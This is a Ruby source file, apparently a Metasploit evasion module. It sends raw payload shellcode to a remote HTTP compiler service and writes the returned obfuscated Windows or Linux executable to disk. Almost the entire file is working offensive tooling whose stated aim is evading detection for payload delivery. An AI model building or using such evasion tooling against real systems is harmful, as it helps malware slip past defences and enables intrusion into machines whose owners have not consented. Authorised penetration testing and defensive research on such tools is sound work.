##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'        => 'Remote HTTP Compiler Evasion',
        'Description' => %q{
          Spikes out a remote compiler workflow for evasion.  Rather than
          relying on a locally installed toolchain, this module sends the
          raw shellcode to a user-operated remote HTTP compiler service
          that returns an obfuscated native binary for the chosen target
          platform and architecture.

          Point RHOST/RPORT at the remote compiler service.  The service
          must accept a JSON POST at COMPILER_URI containing a
          base64-encoded payload, platform, arch, and format fields, and
          respond with the compiled binary as application/octet-stream.
        },
        'Author'        => ['Nipun Weerasinghe'],
        'License'       => MSF_LICENSE,
        'Platform'      => %w[win linux],
        'Arch'          => [ARCH_X86, ARCH_X64, ARCH_AARCH64],
        'Targets'       => [
          ['Windows x86',   { 'Platform' => 'win',   'Arch' => ARCH_X86,    'Format' => 'exe' }],
          ['Windows x64',   { 'Platform' => 'win',   'Arch' => ARCH_X64,    'Format' => 'exe' }],
          ['Linux x86',     { 'Platform' => 'linux', 'Arch' => ARCH_X86,    'Format' => 'elf' }],
          ['Linux x64',     { 'Platform' => 'linux', 'Arch' => ARCH_X64,    'Format' => 'elf' }],
          ['Linux aarch64', { 'Platform' => 'linux', 'Arch' => ARCH_AARCH64, 'Format' => 'elf' }]
        ],
        'DefaultTarget' => 3
      )
    )

    register_options([
      Opt::RHOST,
      Opt::RPORT(8080),
      OptString.new('COMPILER_URI', [true, 'Remote compiler API endpoint path', '/api/compile']),
      OptString.new('FILENAME',     [true, 'Output filename', 'payload.bin'])
    ])
  end

  def run
    raw_payload = payload.encoded
    if raw_payload.blank?
      fail_with(Failure::BadConfig, 'Failed to generate payload')
    end

    print_status("Sending #{raw_payload.length}-byte payload to remote compiler at #{peer}")

    res = send_request_cgi(
      'method' => 'POST',
      'uri'    => normalize_uri(datastore['COMPILER_URI']),
      'ctype'  => 'application/json',
      'data'   => build_compiler_request(raw_payload)
    )

    validate_response!(res)

    compiled = res.body
    print_status("Received compiled binary: #{compiled.length} bytes")

    File.binwrite(datastore['FILENAME'], compiled)
    File.chmod(0o755, datastore['FILENAME']) if target['Platform'] == 'linux'
    print_good("Saved to: #{datastore['FILENAME']}")
  end

  private

  def build_compiler_request(raw_payload)
    {
      'payload'  => Rex::Text.encode_base64(raw_payload).strip,
      'platform' => target['Platform'],
      'arch'     => target['Arch'],
      'format'   => target['Format']
    }.to_json
  end

  def validate_response!(res)
    if res.nil?
      fail_with(Failure::Unreachable, "No response from compiler at #{peer}")
    end

    unless res.code == 200
      fail_with(Failure::UnexpectedReply, "Compiler returned HTTP #{res.code}: #{res.message}")
    end

    if res.body.blank?
      fail_with(Failure::UnexpectedReply, 'Compiler returned an empty response body')
    end
  end
end
